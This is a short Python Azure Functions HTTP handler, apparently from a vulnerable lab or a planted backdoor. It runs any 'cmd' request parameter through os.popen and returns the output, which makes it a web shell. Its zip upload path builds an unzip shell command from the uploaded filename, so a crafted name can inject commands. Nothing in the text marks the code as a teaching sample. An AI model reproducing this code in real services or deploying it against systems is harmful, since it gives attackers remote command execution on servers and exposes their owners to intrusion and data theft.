import logging
import os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    file =  req.files.get('file')
   
    cmd = req.params.get('cmd')
    if cmd:
        try:
            val = os.popen(cmd).read()
            return func.HttpResponse(f"{val}",status_code=200) 
        except Exception as e:
            return func.HttpResponse(f"<pre>{str(e)}</pre>",status_code=200) 


    if file:
        try:
            name, ext = os.path.splitext(file.filename)
            if ext != ".zip":
                return func.HttpResponse(f"Not a zip file!",status_code=200)

            upload_dir = "/tmp/uploads/"
            try:
                if not os.path.exists(upload_dir):
                    os.makedirs(upload_dir)
            except Exception as e:
                error = str(e)
                return func.HttpResponse(f"error found: {error}",status_code=200)
            
            full_filename = upload_dir + file.filename
            file.save(full_filename)
            extract = "unzip '%s' -d '/tmp/uploads/%s'" % (full_filename, name)
            
            val = os.popen(extract).read()
            os.remove(full_filename)
            return func.HttpResponse(f"File \r\n {val}  \r\n {extract} \r\n {file.filename} uploaded",status_code=200)
        except Exception as e:
            error = str(e)
            return func.HttpResponse(f"error found: {extract}",status_code=200)


    return func.HttpResponse(f"Something went wrong!",status_code=200) 